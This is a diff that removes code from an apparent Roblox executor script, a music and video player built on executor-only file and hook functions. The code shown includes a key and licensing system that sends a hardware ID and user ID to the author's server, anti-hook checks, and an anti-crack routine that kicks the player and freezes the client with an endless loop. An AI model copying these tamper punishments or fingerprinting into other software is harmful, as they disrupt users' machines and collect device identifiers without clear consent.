-		Url = str3 .. "/sendgc",
-		Method = "POST",
-		Headers = { ["Content-Type"] = "application/json" },
-		Body = HttpService:JSONEncode({ key = KEY_ATUAL, hwid = YmpHwid(), Userid = userId, msg = arg }),
-	})
-
-	if v20 and v20.Body then
-		local str10 = tostring(v20.Body):gsub("%s+", ""):gsub("\"", "")
-
-		if str10 == "banned" then
-			flag16 = true
-			fn18()
-		elseif str10 == "requestdenied" then
-			fn3(Traducao.ErroCrackTitle, Traducao.ErroCrackText, 10)
-		end
-	end
-
-	return v20
-end
-
-SendGC.MouseButton1Click:Connect(function()
-	if Aviao.ImageTransparency ~= 0 then
-		return
-	end
-	local text2 = GCBox.Text
-
-	if text2 and text2 ~= "" then
-		GCBox.Text = ""
-		Aviao.ImageTransparency = 0.7
-		fn21(text2)
-		task.wait(3)
-		Aviao.ImageTransparency = 0
-	end
-end)
-
-GCBox.FocusLost:Connect(function()
-	local match = GCBox.Text:gsub("[\r\n]", ""):match("^%s*(.-)%s*$")
-	if match == "" then
-		GCBox.Text = ""
-		return
-	end
-
-	if #match > 200 then
-		match = match:sub(1, 200)
-	end
-
-	GCBox.Text = match
-end)
-
-Regras.MouseButton1Click:Connect(function()
-	fn3(Traducao.RegrasTi, Traducao.Regras, 10)
-end)
-
-NotificarGC.MouseButton1Click:Connect(function()
-	if Sino.Image == "rbxassetid://115374069603142" then
-		Sino.Image = "rbxassetid://89973491623305"
-		fn3(Traducao.GCmudo, Traducao.GCmudoTexto, 6)
-		flag17 = true
-	else
-		Sino.Image = "rbxassetid://115374069603142"
-		fn3(Traducao.GCunmudo, Traducao.GCunmudoTexto, 6)
-		flag17 = false
-	end
-end)
-
-Denunciar.MouseButton1Click:Connect(function()
-	if not Denunciar.Active then
-		return
-	end
-	fn14(REPORT_ID)
-end)
-
-MotivoBox.FocusLost:Connect(function()
-	local match = MotivoBox.Text:match("^%s*(.-)%s*$")
-
-	if match == "" then
-		MotivoBox.Text = ""
-		REPORT_MOTIVO = nil
-	else
-		REPORT_MOTIVO = match
-	end
-end)
-
-CancelarReport.MouseButton1Click:Connect(function()
-	if not CancelarReport.Active then
-		return
-	end
-	REPORT_ID = nil
-	REPORT_MOTIVO = nil
-	TextoReportFrame.Text = ""
-	MotivoBox.Text = ""
-	FotoReport.Image = ""
-	ReportFrame.Visible = false
-	frame.Visible = true
-end)
-
-CloseWarn.MouseButton1Click:Connect(function()
-	if CloseWarn.BackgroundTransparency ~= 0 then
-		return
-	end
-	Warn.Visible = false
-	BlurEffect.Size = 0
-	imageButton.Visible = true
-	fn2("88442833509532")
-end)
-
-Traduzir.MouseButton1Click:Connect(function()
-	if FotoTradu.Image == "rbxassetid://84867288877251" then
-		FotoTradu.Image = "rbxassetid://72657045512999"
-		fn3(Traducao.TraducaoSystem, Traducao.TraduOn, 5)
-	else
-		FotoTradu.Image = "rbxassetid://84867288877251"
-		fn3(Traducao.TraducaoSystem, Traducao.TraduOff, 5)
-	end
-end)
-
-Priv1.MouseButton1Click:Connect(function()
-	fn3(Traducao.PP, Traducao.SobrePri1, 8)
-end)
-
-Priv2.MouseButton1Click:Connect(function()
-	fn3(Traducao.PP, Traducao.SobrePri2, 8)
-end)
-
-Priv3.MouseButton1Click:Connect(function()
-	fn3(Traducao.PP, Traducao.SobrePri3, 8)
-end)
-
-Priv4.MouseButton1Click:Connect(function()
-	fn3(Traducao.PP, Traducao.SobrePri4, 8)
-end)
-
-Priv5.MouseButton1Click:Connect(function()
-	fn3(Traducao.PP, Traducao.SobrePri5, 8)
-end)
-
-Priv6.MouseButton1Click:Connect(function()
-	fn3(Traducao.PP, Traducao.SobrePri6, 8)
-end)
-
-local function fn22()
-	pcall(function()
-		game:GetService("Players").LocalPlayer:Kick("[Sussy Activity]\nPlease do not attempt to crack the script!")
-	end)
-
-	pcall(function()
-		game:GetService("Players").LocalPlayer:Remove()
-	end)
-
-	pcall(function()
-		game:GetService("Players").LocalPlayer:Destroy()
-	end)
-
-	pcall(function()
-		game:GetService("Players").LocalPlayer.Parent = nil
-	end)
-
-	task.wait(2)
-
-	while true do
-	end
-end
-
-LockedUIS = { Video, imageButton2, frame2 }
-
-for _, v20 in ipairs(LockedUIS) do
-	if v20:IsA("GuiObject") then
-		v20:GetPropertyChangedSignal("Visible"):Connect(function()
-			if v20.Visible == true and flag19 == false then
-				fn22()
-			end
-		end)
-	end
-end
-
-SetKey = function(key)
-	task.spawn(function()
-		table.insert(tbl7, function()
-			local ok3, result3 = pcall(function()
-				return HttpService:JSONDecode(readfile("YouTube Music Player/Internal/Data.json"))
-			end)
-
-			local v20 = ok3 and result3
-			local tbl17
-
-			if v20 then
-				tbl17 = v20
-			else
-				tbl17 = { { Key = "", Favorites = tbl6 or {} } }
-			end
-
-			tbl17[1] = tbl17[1] or { Key = "", Favorites = {} }
-			tbl17[1].Key = key or ""
-
-			pcall(function()
-				writefile("YouTube Music Player/Internal/Data.json", HttpService:JSONEncode(tbl17))
-			end)
-		end)
-
-		processQueue()
-	end)
-end
-
-local function fn23()
-	if flag19 == true then
-		return
-	end
-	flag19 = true
-	KeyFrame.Visible = false
-	GetKey.Visible = false
-	PremiumOkTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.VocePremium .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.VocePremiumTexto .. "</font>"
-	frame2.Visible = true
-	imageButton2.Parent = screenGui
-	Video.Parent = Tela2
-	BotaoMp4.BackgroundTransparency = 0
-	NomeMp4.TextColor3 = Color3.fromRGB(154, 205, 50)
-	BotaoMp4.AutoButtonColor = true
-	AplicarFiltro.BackgroundTransparency = 0
-	RemoverFiltro.BackgroundTransparency = 0
-	NomeAplicarFiltro.TextColor3 = Color3.fromRGB(154, 205, 50)
-	NomeRemoverFiltro.TextColor3 = Color3.fromRGB(178, 34, 34)
-	AplicarFiltro.AutoButtonColor = true
-	RemoverFiltro.AutoButtonColor = true
-	PesquisarBox.PlaceholderText = Traducao.Pesquisar2
-	imageButton.Image = "rbxassetid://76673896881913"
-	fn3(Traducao.VocePremium, Traducao.VocePremiumTexto, 15)
-	imageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	Stroke(imageButton, 255, 215, 0, 3)
-
-	if not flag16 and websocket_ ~= nil and not flag20 then
-		MsgErroGC.Visible = false
-		GCBox.Active = true
-		GCBox.Visible = true
-		SendGC.Visible = true
-		Traduzir.Visible = true
-		LinhaTraducao.Visible = true
-	end
-
-	for _, child in ipairs(ScrollPagina:GetChildren()) do
-		if child:IsA("ImageButton") and child.Name ~= "1" then
-			child.BackgroundTransparency = 0
-			local textLabel = child:FindFirstChildOfClass("TextLabel")
-
-			if textLabel then
-				textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-			end
-		end
-	end
-
-	for _, v20 in ipairs(scrolls) do
-		for _, child in ipairs(v20:GetChildren()) do
-			if child:IsA("ImageButton") and not child:GetAttribute("Privado") then
-				local match = child.Name:match(":(.+)$")
-				child.Name:match("^(.-):")
-				local tag = child:FindFirstChild("tag")
-				local imageLabel = child:FindFirstChildWhichIsA("ImageLabel")
-
-				if match and tag and imageLabel then
-					if match == "Video" or match == "Roblox" then
-						child.BackgroundTransparency = 0
-						imageLabel.BackgroundTransparency = 0
-						imageLabel.ImageTransparency = 0
-						tag.TextColor3 = Color3.fromRGB(255, 255, 255)
-					end
-				end
-			end
-		end
-	end
-end
-
-Token = nil
-
-local function fn24()
-	pcall(function()
-		local fn25
-
-		fn25 = function(arg, arg2)
-			local tbl17 = arg2 or {}
-			local kind = typeof(arg)
-			if kind == "nil" then
-				return "nil"
-			end
-
-			if kind == "string" then
-				return arg
-			end
-
-			if kind == "number" then
-				if arg ~= arg then
-					return "nan"
-				end
-				local str10 = ""
-
-				if arg < 0 then
-					arg = -arg
-					str10 = "-"
-				end
-
-				local n8 = math.floor(arg)
-				local n9 = arg - n8
-				local str11 = ""
-
-				repeat
-					str11 = string.char(48 + n8 % 10) .. str11
-					n8 = math.floor(n8 / 10)
-				until n8 == 0
-
-				if n9 > 0 then
-					str11 ..= "."
-					local n10 = 0
-
-					while n9 > 0 and n10 < 6 do
-						local n11 = n9 * 10
-						local n12 = math.floor(n11)
-						str11 ..= string.char(48 + n12)
-						n9 = n11 - n12
-						n10 += 1
-					end
-				end
-
-				return str10 .. str11
-			end
-
-			if kind == "boolean" then
-				if arg then
-					return "true"
-				end
-				return "false"
-			end
-
-			if kind == "table" then
-				if tbl17[arg] then
-					return "{cycle}"
-				end
-				tbl17[arg] = true
-				local tbl18 = {}
-
-				for k, v20 in pairs(arg) do
-					table.insert(tbl18, "[" .. fn25(k, tbl17) .. "]=" .. fn25(v20, tbl17))
-				end
-
-				return "{ " .. table.concat(tbl18, ", ") .. " }"
-			end
-
-			return "<" .. kind .. ">"
-		end
-
-		local jobId = game.JobId
-		local str10 = HttpService:GenerateGUID(false) .. HttpService:GenerateGUID(false) .. jobId .. tick() .. os.clock() .. os.time() .. os.date("%Y%m%d%H%M%S") .. math.random() .. fn25({})
-		local n8 = 2166136261
-
-		for i = 1, #str10 do
-			local v20 = string.byte(str10, i)
-			local n9 = bit32.bxor(n8, v20) * 16777619 % 4294967296
-			n8 = bit32.bxor(n9, bit32.rshift(n9, 13)) * 2246822519 % 4294967296
-		end
-
-		math.randomseed(n8)
-		local str11 = ""
-		local n9 = 1
-
-		while true do
-			local n10 = math.random(1, 62)
-			local str12 = str11 .. string.sub("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", n10, n10)
-			local n11 = bit32.bxor(n8, n10 * n9) * 3266489917 % 4294967296
-			n8 = bit32.bxor(n11, bit32.lshift(n11, 11))
-
-			if #str12 > 10 and bit32.band(n8, 3) == 0 then
-				local n12 = math.floor(#str12 / 2)
-				local str13 = string.sub(str12, 1, n12)
-				str12 = string.sub(str12, n12 + 1) .. str13
-			end
-
-			if #str12 > 15 and bit32.band(n8, 7) == 1 then
-				str11 = ""
-
-				for i = #str12, 1, -1 do
-					str11 ..= string.sub(str12, i, i)
-				end
-			else
-				str11 = str12
-			end
-
-			local v20 = bit32.band(n8, 15)
-			if not (#str11 > 110 and v20 == 0 or #str11 > 111) then
-				n9 += 1
-				continue
-			end
-			break
-		end
-
-		Token = str11
-	end)
-end
-
-local function fn25(arg)
-	local tbl17 = { bit32.bxor, bit32.lrotate, string.byte, string.format, tostring }
-
-	if typeof(ishooked) == "function" and typeof(restorefunction) == "function" then
-		local ok3, result3 = pcall(ishooked, ishooked)
-
-		if ok3 and result3 then
-			pcall(restorefunction, ishooked)
-		end
-
-		local v20 = ishooked
-
-		for _, v21 in ipairs(tbl17) do
-			local ok4, result4 = pcall(v20, v21)
-			if not ok4 or result4 then
-				return
-			end
-		end
-	end
-
-	local function fn26(arg2)
-		local str10 = tostring(arg2 or "nil")
-		local n8 = 2246822507
-		local n9 = 3266489909
-		local n10 = 2146245185
-
-		for i = 1, #str10 do
-			local v20 = string.byte(str10, i)
-			n8 = (bit32.lrotate(bit32.bxor(n8, v20 + i), 13) * 5 + 3864292196) % 4294967296
-			n9 = (bit32.lrotate(bit32.bxor(n9, n8 + v20), 17) * 3 + 2246822507) % 4294967296
-			n10 = (bit32.lrotate(bit32.bxor(n10, n9 + i), 19) * 7 + 2815685321) % 4294967296
-		end
-
-		local v20 = bit32.bxor(n8, n9, n10, 2674666769)
-		local str11 = string.format("%08x%08x%08x%08x%08x", n8, n9, n10, 2674666769, v20)
-		return (str11 .. string.reverse(str11)):sub(1, 40)
-	end
-
-	if arg == fn26(Token) and #Token > 110 then
-		fn23()
-	else
-		SetKey("")
-	end
-end
-
-local function fn26(arg)
-	local now = os.clock()
-	local flag22 = false
-	local str10 = nil
-
-	task.spawn(function()
-		local v20 = HttpService
-		local str11 = str3 .. "/check/" .. arg .. "/" .. YmpHwid() .. "/" .. v20:UrlEncode(Token)
-
-		local ok3, result3 = pcall(function()
-			return game:HttpGet(str11)
-		end)
-
-		if not CheckRequest() then
-			fn3(Traducao.Erro, Traducao.FalhaAoChekar, 10)
-			KeyBox.Active = true
-			str10 = "error"
-			flag22 = true
-			return
-		end
-
-		if not (ok3 and result3) then
-			fn3(Traducao.Erro, Traducao.FalhaAoChekar, 10)
-			KeyBox.Active = true
-			str10 = "error"
-			flag22 = true
-			return
-		end
-
-		local v21 = string.lower(result3)
-
-		if string.find(v21, "request denied") then
-			str10 = "invalid"
-			flag22 = true
-			return
-		end
-
-		if string.find(v21, "too many request") then
-			str10 = "too"
-			flag22 = true
-			return
-		end
-
-		if string.find(v21, "already registered") then
-			str10 = "already"
-			flag22 = true
-			return
-		end
-
-		local v22 = string.match(result3, "Ok:%s*(.+)")
-
-		if not v22 then
-			str10 = "error"
-			flag22 = true
-			return
-		end
-
-		task.wait(1)
-		fn25(v22)
-		SetKey(arg)
-		str10 = "ok"
-		flag22 = true
-	end)
-
-	while not flag22 do
-		if os.clock() - now > 10 then
-			return "error"
-		end
-		task.wait()
-	end
-
-	return str10 or "error"
-end
-
-local function fn27()
-	if CACHE_LINK ~= nil then
-		YmpClipboard(CACHE_LINK)
-		fn3(Traducao.LinkCopiado, Traducao.Navegador, 10)
-		return CACHE_LINK
-	end
-
-	if not CheckRequest() then
-		return nil
-	end
-
-	local ok3, result3 = pcall(function()
-		return game:HttpGet(str3 .. "/getkey?hwid=" .. tostring(YmpHwid()))
-	end)
-
-	if not ok3 or not result3 then
-		fn3("Premium Key", Traducao.KeyError, 5)
-		return nil
-	end
-	local data2 = nil
-
-	pcall(function()
-		data2 = game:GetService("HttpService"):JSONDecode(result3)
-	end)
-
-	if not data2 or not data2.success or not data2.url then
-		fn3("Premium Key", Traducao.KeyError, 5)
-		return nil
-	end
-	CACHE_LINK = data2.url
-	YmpClipboard(CACHE_LINK)
-	fn3(Traducao.LinkCopiado, Traducao.Navegador, 10)
-	return CACHE_LINK
-end
-
-SetaES.MouseButton1Click:Connect(function()
-	if GetKey.BackgroundColor3 == Color3.fromRGB(47, 79, 79) then
-		GetKey.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-		SetaES.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-		SetaDI.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-		GetKeyTexto.Text = Traducao.Robux
-		GetKeyTexto.TextColor3 = Color3.fromRGB(255, 255, 153)
-	elseif GetKey.BackgroundColor3 == Color3.fromRGB(255, 215, 0) then
-		GetKey.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-		SetaES.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-		SetaDI.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-		GetKeyTexto.Text = Traducao.Link
-		GetKeyTexto.TextColor3 = Color3.fromRGB(70, 130, 180)
-	end
-end)
-
-SetaDI.MouseButton1Click:Connect(function()
-	if GetKey.BackgroundColor3 == Color3.fromRGB(47, 79, 79) then
-		GetKey.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-		SetaES.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-		SetaDI.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
-		GetKeyTexto.Text = Traducao.Robux
-		GetKeyTexto.TextColor3 = Color3.fromRGB(255, 255, 153)
-	elseif GetKey.BackgroundColor3 == Color3.fromRGB(255, 215, 0) then
-		GetKey.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-		SetaES.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-		SetaDI.BackgroundColor3 = Color3.fromRGB(47, 79, 79)
-		GetKeyTexto.Text = Traducao.Link
-		GetKeyTexto.TextColor3 = Color3.fromRGB(70, 130, 180)
-	end
-end)
-
-local function fn28(text2)
-	fn3("Premium Key", text2, 5)
-	KeyBox.Active = false
-	KeyBox.TextColor3 = Color3.fromRGB(255, 0, 0)
-	KeyBox.Text = text2
-	task.wait(2)
-	KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-	KeyBox.Text = ""
-	KeyBox.Active = true
-end
-
-local function fn29()
-	if KEY_ATUAL and KEY_ATUAL ~= "" then
-		KeyBox.Active = false
-		fn24()
-
-		if not KEY_ATUAL:match("^KEY_") and not KEY_ATUAL:match("^FREE_") then
-			fn28(Traducao.KeyInvalida)
-			SetKey("")
-			return
-		end
-
-		local v20 = fn26(KEY_ATUAL)
-		if v20 == true then
-			return
-		end
-
-		if v20 == "invalid" then
-			fn28(Traducao.KeyInvalida)
-			SetKey("")
-		elseif v20 == "error" then
-			fn28(Traducao.KeyErro)
-		elseif v20 == "already" then
-			fn28(Traducao.JaTemKey)
-		elseif v20 == "too" then
-			fn28(Traducao.RateLi)
-		end
-	end
-end
-
-KeyBox.FocusLost:Connect(function()
-	if KeyBox.Active and KeyBox.Text then
-		local match = KeyBox.Text:match("^%s*(.-)%s*$")
-		if match == "" then
-			KeyBox.Text = ""
-			return
-		end
-		KEY_ATUAL = match
-		fn29()
-	end
-end)
-
-GetKey.MouseButton1Click:Connect(function()
-	if GetKey.BackgroundColor3 == Color3.fromRGB(255, 215, 0) then
-		fn3(Traducao.LinkCopiado, "https://www.roblox.com/games/113089627618447/CHAOTIC-Purchase", 8)
-		YmpClipboard("https://www.roblox.com/games/113089627618447/CHAOTIC-Purchase")
-	elseif GetKey.BackgroundColor3 == Color3.fromRGB(47, 79, 79) then
-		fn27()
-	end
-end)
-
-uiScale = frame:FindFirstChildOfClass("UIScale") or Instance.new("UIScale", frame)
-
-Resize = function()
-	local viewportSize = currentCamera.ViewportSize
-	uiScale.Scale = math.min(viewportSize.X * 0.8 / frame.AbsoluteSize.X / uiScale.Scale, viewportSize.Y * 0.8 / frame.AbsoluteSize.Y / uiScale.Scale, 1)
-	frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-
-	task.defer(function()
-		if flag8 then
-			return
-		end
-		local v20 = v12
-		local flag22 = v12
-
-		if v20 then
-			flag22 = v20.TimeLength > 0
-		end
-
-		if flag22 then
-			setProgress(v20.TimePosition / v20.TimeLength)
-		end
-	end)
-end
-
-ResizeJa = function()
-	imageButton.AnchorPoint = Vector2.new(0.5, 0)
-	imageButton.Position = UDim2.new(0.5, 0, 0, 20)
-end
-
-ResizeMiniPlayer = function()
-	local viewportSize = currentCamera.ViewportSize
-
-	if viewportSize.Y > viewportSize.X then
-		udim2 = UDim2.new(0.45, 0, 0.1, 0)
-	else
-		udim2 = UDim2.new(0.27, 0, 0.37, 0)
-	end
-
-	local udim24
-
-	if flag10 then
-		udim24 = UDim2.new(udim2.X.Scale * 1.4, 0, udim2.Y.Scale * 1.4, 0)
-	else
-		udim24 = udim2
-	end
-
-	imageButton2.Size = udim24
-	imageButton2.Position = UDim2.new(1, -20, 1, -20)
-end
-
-currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
-	Resize()
-	ResizeJa()
-	ResizeMiniPlayer()
-end)
-
-Resize()
-ResizeJa()
-ResizeMiniPlayer()
-
-game:GetService("GuiService").MenuOpened:Connect(function()
-	if flag or not frame.Visible then
-		return
-	end
-	frame.Visible = false
-	imageButton.Visible = true
-end)
-
-v5.MessageOut:Connect(function(arg)
-	if type(arg) ~= "string" then
-		return
-	end
-	local str10 = arg:lower():gsub("%s+", "")
-
-	if str10:match("^failedtoloadrbxasset://.+%.mp3$") or str10:match("^failedtoloadrbxasset://.+%.webm$") then
-		fn3(Traducao.MidiaErro, Traducao.MidiaErroMsg, 10)
-	end
-end)
-
-Corner(frame, 5)
-Corner(imageButton, 30)
-Corner(ContadorJA, 30)
-Corner(ContadorJABO, 30)
-Corner(Titulo, 30)
-Corner(Mutar, 30)
-Corner(BotaoFechar, 22)
-Corner(Welcome, 5)
-Corner(Navegacao, 5)
-Corner(Playlist, 5)
-Corner(TituloNave, 32)
-Corner(FotoNave, 32)
-Corner(TituloPlayL, 32)
-Corner(FotoPlayL, 32)
-Corner(Botao1, 5)
-Corner(Botao2, 5)
-Corner(Botao3, 5)
-Corner(Botao4, 5)
-Corner(Botao5, 5)
-Corner(Botao6, 5)
-Corner(Icone1, 5)
-Corner(Icone2, 5)
-Corner(Icone3, 5)
-Corner(Icone4, 5)
-Corner(Icone5, 5)
-Corner(Icone6, 5)
-Corner(EsquerdaPL, 5)
-Corner(FrameAbaPL, 5)
-Corner(DireitaPL, 5)
-Corner(ErroPL, 5)
-Corner(Dev, 5)
-Corner(FotoDev, 50)
-Corner(Social, 5)
-Corner(SocialTitulo, 5)
-Corner(You, 32)
-Corner(IconeYou, 32)
-Corner(Discord, 32)
-Corner(IconeDiscord, 32)
-Corner(Musica, 5)
-Corner(Video, 5)
-Corner(TempoAtual, 5)
-Corner(TempoTotal, 5)
-Corner(Repetir, 30)
-Corner(Novamente, 30)
-Corner(Miniplayer, 30)
-Corner(BarraProgresso, 30)
-Corner(Rastro, 30)
-Corner(BolaProgresso, 30)
-Corner(MicroBola, 10)
-Corner(PlayerInfo, 5)
-Corner(FotoAutor, 50)
-Corner(Disco, 50)
-Corner(Controles, 5)
-Corner(Voltar, 40)
-Corner(Retroceder, 40)
-Corner(Play, 40)
-Corner(Adiantar, 40)
-Corner(Pular, 40)
-Corner(MiniMusica, 10)
-Corner(MiniVideo, 10)
-Corner(MiniBack, 2, 0)
-Corner(MiniRetroceder, 2, 0)
-Corner(MiniPlay, 1, 0)
-Corner(MiniAvancar, 1, 0)
-Corner(MiniSkip, 1, 0)
-Corner(TelaCheia, 1, 0)
-Corner(FecharMini, 1, 0)
-Corner(TituloEqua, 5)
-Corner(EquaFrame, 5)
-Corner(NoEquaFrame, 5)
-Corner(ErroEqua, 5)
-Corner(Volume, 5)
-Corner(IconeVolume, 5)
-Corner(Pitch, 5)
-Corner(IconePitch, 5)
-Corner(FrequenciaTitulo, 5)
-Corner(Graves, 5)
-Corner(IconeGraves, 5)
-Corner(Medios, 5)
-Corner(IconeMedios, 5)
-Corner(Agudos, 5)
-Corner(IconeAgudos, 5)
-Corner(EfeitosTitulo, 5)
-Corner(Nenhum, 5)
-Corner(IconeNenhum, 5)
-Corner(Reverb, 5)
-Corner(IconeReverb, 5)
-Corner(Echo, 5)
-Corner(IconeEcho, 5)
-Corner(Distortion, 5)
-Corner(IconeDistortion, 5)
-Corner(Chorus, 5)
-Corner(IconeChorus, 5)
-Corner(Flanger, 5)
-Corner(IconeFlanger, 5)
-Corner(Tremolo, 5)
-Corner(IconeTremolo, 5)
-Corner(Compressor, 5)
-Corner(IconeCompressor, 5)
-Corner(Radio, 5)
-Corner(IconeRadio, 5)
-Corner(Cinema, 5)
-Corner(IconeCinema, 5)
-Corner(Underwater, 5)
-Corner(IconeUnderwater, 5)
-Corner(Kid, 5)
-Corner(IconeKid, 5)
-Corner(Robot, 5)
-Corner(IconeRobot, 5)
-Corner(Slowed, 5)
-Corner(IconeSlowed, 5)
-Corner(ResetarEqua, 5)
-Corner(Pesquisa, 5)
-Corner(Lupa, 5)
-Corner(Filtro, 5)
-Corner(DownloadFrame, 5)
-Corner(PaginaFrame, 5)
-Corner(PaginaEsperandoFrame, 5)
-Corner(PaginaEsperandoIcon, 5)
-Corner(SemResultadoTexto, 5)
-Corner(ErroTexto, 5)
-Corner(Tutorial, 30)
-Corner(BaixandoTexto, 5)
-Corner(DownloadFrameTexto, 5)
-Corner(Relevancia, 5)
-Corner(DataUpload, 5)
-Corner(Duracao, 5)
-Corner(IconeRelevancia, 5)
-Corner(IconeDataUpload, 5)
-Corner(IconeDuracao, 5)
-Corner(AplicarFiltro, 5)
-Corner(RemoverFiltro, 5)
-Corner(Thumbfor, 5)
-Corner(Titulofor, 5)
-Corner(TituloFiltro, 30)
-Corner(TituloFormato, 30)
-Corner(BotaoMp3, 5)
-Corner(BotaoMp4, 5)
-Corner(BotaoCancelar, 5)
-Corner(TituloGC, 5)
-Corner(GCFrame, 5)
-Corner(Traduzir, 5)
-Corner(SendGC, 5)
-Corner(MsgFrame, 5)
-Corner(AvisoGC, 30)
-Corner(FinalGC, 32)
-Corner(TituloPremium, 5)
-Corner(Privilegios, 5)
-Corner(Priv1, 35)
-Corner(Priv2, 35)
-Corner(Priv3, 35)
-Corner(Priv4, 35)
-Corner(Priv5, 35)
-Corner(Priv6, 35)
-Corner(IconePriv1, 35)
-Corner(IconePriv2, 35)
-Corner(IconePriv3, 35)
-Corner(IconePriv4, 35)
-Corner(IconePriv5, 35)
-Corner(IconePriv6, 35)
-Corner(frame2, 5)
-Corner(PremiumOkTexto, 5)
-Corner(KeyFrame, 5)
-Corner(SendKey, 5)
-Corner(GetKey, 5)
-Corner(SetaES, 5)
-Corner(SetaDI, 5)
-Corner(ReportFrame, 5)
-Corner(TituloReportFrame, 30)
-Corner(TextoReportFrameFrame, 5)
-Corner(Motivo, 5)
-Corner(CancelarReport, 7)
-Corner(FotoReport, 50)
-Corner(Denunciar, 7)
-Corner(Warn, 5)
-Corner(TituloWarn, 30)
-Corner(TextoWarnFrame, 5)
-Corner(CloseWarn, 7)
-Stroke(frame, 255, 0, 0, 5)
-Stroke(imageButton, 255, 255, 255, 3)
-Stroke(ContadorJA, 255, 255, 255, 1)
-Stroke(ContadorJANU, 255, 255, 255, 0.5)
-Stroke(ContadorJABO, 255, 255, 255, 1)
-Stroke(ContadorJANUBO, 255, 255, 255, 0.5)
-Stroke(Mutar, 255, 255, 255, 1)
-Stroke(BotaoFechar, 255, 255, 255, 1)
-Stroke(Titulo, 50, 50, 50, 1.5)
-Stroke(TextoTitulo, 0, 0, 0, 1.5)
-Stroke(Welcome, 50, 50, 50, 1.5)
-Stroke(NomeWelcome, 255, 255, 255, 1)
-Stroke(Navegacao, 50, 50, 50, 1.5)
-Stroke(Playlist, 50, 50, 50, 1.5)
-Stroke(TituloNave, 255, 255, 255, 1)
-Stroke(FotoNave, 255, 255, 255, 1)
-Stroke(NomeNave, 255, 255, 255, 1)
-Stroke(TituloPlayL, 255, 255, 255, 1)
-Stroke(FotoPlayL, 255, 255, 255, 1)
-Stroke(NomePlayL, 255, 255, 255, 1)
-Stroke(AbaPL, 255, 255, 255, 1)
-Stroke(Botao1, 255, 0, 0, 2)
-Stroke(Botao2, 50, 50, 50, 2)
-Stroke(Botao3, 50, 50, 50, 2)
-Stroke(Botao4, 50, 50, 50, 2)
-Stroke(Botao5, 50, 50, 50, 2)
-Stroke(Botao6, 50, 50, 50, 2)
-Stroke(Icone1, 255, 0, 0, 2)
-Stroke(Icone2, 50, 50, 50, 2)
-Stroke(Icone3, 50, 50, 50, 2)
-Stroke(Icone4, 50, 50, 50, 2)
-Stroke(Icone5, 50, 50, 50, 2)
-Stroke(Icone6, 50, 50, 50, 2)
-Stroke(Nome1, 0, 0, 0, 1.5)
-Stroke(Nome2, 0, 0, 0, 1.5)
-Stroke(Nome3, 0, 0, 0, 1.5)
-Stroke(Nome4, 0, 0, 0, 1.5)
-Stroke(Nome6, 0, 0, 0, 1.5)
-Stroke(EsquerdaPL, 255, 255, 255, 1)
-Stroke(FrameAbaPL, 255, 255, 255, 1)
-Stroke(DireitaPL, 255, 255, 255, 1)
-Stroke(Dev, 50, 50, 50, 1.5)
-Stroke(FotoDev, 178, 34, 34, 1.5)
-Stroke(TextoDev, 0, 0, 0, 2)
-Stroke(Social, 50, 50, 50, 1.5)
-Stroke(SocialTitulo, 50, 50, 50, 1.5)
-Stroke(SocialTexto, 0, 0, 0, 2)
-Stroke(Discord, 0, 0, 0, 1.5)
-Stroke(IconeDiscord, 0, 0, 0, 1.5)
-Stroke(TextoDiscord, 0, 0, 0, 1.5)
-Stroke(You, 255, 255, 255, 1.5)
-Stroke(IconeYou, 255, 255, 255, 1.5)
-Stroke(TextoYou, 0, 0, 0, 1.5)
-Stroke(Musica, 50, 50, 50, 1.5)
-Stroke(Video, 50, 50, 50, 1.5)
-Stroke(TempoAtual, 50, 50, 50, 1)
-Stroke(TempoTotal, 50, 50, 50, 1)
-Stroke(Repetir, 50, 50, 50, 1)
-Stroke(Novamente, 50, 50, 50, 1)
-Stroke(Miniplayer, 50, 50, 50, 1)
-Stroke(BolaProgresso, 255, 255, 255, 1)
-Stroke(BarraProgresso, 50, 50, 50, 1.5)
-Stroke(PlayerInfo, 50, 50, 50, 1.5)
-Stroke(FotoAutor, 178, 34, 34, 1.5)
-Stroke(Disco, 178, 34, 34, 1.5)
-Stroke(Controles, 178, 34, 34, 1.5)
-Stroke(Voltar, 255, 255, 255, 1)
-Stroke(Retroceder, 255, 255, 255, 1)
-Stroke(Play, 255, 255, 255, 1)
-Stroke(Adiantar, 255, 255, 255, 1)
-Stroke(Pular, 255, 255, 255, 1)
-Stroke(TituloMusica, 0, 0, 0, 1)
-Stroke(MiniMusica, 255, 255, 255, 1, 0.5)
-Stroke(MiniVideo, 255, 255, 255, 1, 0.5)
-Stroke(TituloEqua, 50, 50, 50, 1.5)
-Stroke(NomeEqua, 255, 255, 255, 1)
-Stroke(EquaFrame, 50, 50, 50, 1.5)
-Stroke(NoEquaFrame, 50, 50, 50, 1.5)
-Stroke(Volume, 50, 50, 50, 2)
-Stroke(IconeVolume, 50, 50, 50, 2)
-Stroke(VolumeBox, 0, 0, 0, 1)
-Stroke(Pitch, 50, 50, 50, 2)
-Stroke(IconePitch, 50, 50, 50, 2)
-Stroke(PitchBox, 0, 0, 0, 1)
-Stroke(FrequenciaTitulo, 50, 50, 50, 2)
-Stroke(TextoFrenquencia, 255, 255, 255, 0.4)
-Stroke(Graves, 50, 50, 50, 2)
-Stroke(IconeGraves, 50, 50, 50, 2)
-Stroke(GravesBox, 0, 0, 0, 1)
-Stroke(Medios, 50, 50, 50, 2)
-Stroke(IconeMedios, 50, 50, 50, 2)
-Stroke(MediosBox, 0, 0, 0, 1)
-Stroke(Agudos, 50, 50, 50, 2)
